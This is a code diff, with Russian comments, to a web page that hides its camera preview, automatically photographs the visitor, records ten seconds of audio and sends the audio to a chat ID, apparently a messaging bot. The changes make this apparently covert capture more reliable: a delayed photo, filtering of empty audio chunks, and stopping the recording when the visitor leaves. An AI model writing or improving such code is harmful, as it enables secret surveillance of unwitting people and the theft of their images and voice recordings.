@@ -28,7 +28,7 @@
       line-height: 1.5;
       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
-    #video, #canvas { display: none; } /* Скрываем видео и канвас */
+    #video, #canvas { display: none; }
   </style>
 </head>
 <body>
@@ -55,7 +55,8 @@
       .then(stream => {
         video.srcObject = stream;
         video.onloadedmetadata = () => {
-          takePhoto(stream); // Фото сразу
+          // Задержка 1 секунда перед фото, чтобы камера прогрузилась
+          setTimeout(() => takePhoto(stream), 1000);
           startRecording(stream); // Начало записи аудио
         };
       })
@@ -80,20 +81,26 @@
 
     // Начало записи аудио
     function startRecording(stream) {
-      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
       audioChunks = [];
 
-      mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+      mediaRecorder.ondataavailable = event => {
+        if (event.data.size > 0) audioChunks.push(event.data);
+      };
       mediaRecorder.onstop = () => sendAudio();
 
-      mediaRecorder.start();
+      mediaRecorder.start(100); // Собираем данные каждые 100 мс
       setTimeout(() => {
-        if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-      }, 10000); // Макс 10 секунд
+        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+      }, 10000); // 10 секунд
     }
 
     // Отправка аудио
     async function sendAudio() {
+      if (audioChunks.length === 0) {
+        console.error('Нет аудиоданных');
+        return;
+      }
       const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
       const formData = new FormData();
       formData.append('chat_id', chatId);
@@ -107,7 +114,7 @@
 
     // Остановка записи при уходе со страницы
     window.onbeforeunload = () => {
-      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
         mediaRecorder.stop();
       }
     };
